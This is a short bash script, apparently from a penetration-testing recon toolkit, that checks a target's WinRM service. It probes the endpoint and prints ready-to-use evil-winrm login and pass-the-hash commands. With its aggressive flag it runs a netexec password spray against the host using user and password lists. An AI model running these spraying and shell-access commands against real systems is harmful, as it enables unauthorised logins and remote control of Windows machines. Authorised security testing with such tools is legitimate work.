#!/usr/bin/env bash
# recce-service: WinRM (5985/5986) - endpoint, auth, exec-with-creds path
. "$(cd "$(dirname "$0")/.." && pwd)/lib.sh"
T="$1"; P="${2:-5985}"; [ "$3" = "-a" ] && AGGR=1
svc_start "WINRM" "$T" "$P"

SCHEME=http; [ "$P" = 5986 ] && SCHEME=https
find_ "WinRM open -> remote PowerShell. With ANY local-admin (or Remote Management Users) creds this is a full shell"
if have curl; then
  info "WSMan endpoint probe:"
  run curl -sSk -m 8 -D - -o /dev/null "$SCHEME://$T:$P/wsman" -X POST -H 'Content-Type: application/soap+xml'
fi
nse "$T" "$P" "http-title"
note "exec with creds:   evil-winrm -i $T -u USER -p PASS         (or -H <nthash> for pass-the-hash)"
note "spray to find them: netexec winrm $T -u users.txt -p passwords.txt --continue-on-success"
note "LocalAccountTokenFilterPolicy=1 or a domain admin => WinRM = instant SYSTEM-capable shell"

if aggr && { have netexec || have nxc || have crackmapexec; }; then
  CME=$(command -v netexec || command -v nxc || command -v crackmapexec)
  sec "WinRM spray (intrusive)"; run "$CME" winrm "$T" -u users.txt -p passwords.txt --continue-on-success
else skip_aggr "netexec winrm spray (needs users.txt/passwords.txt)"; fi
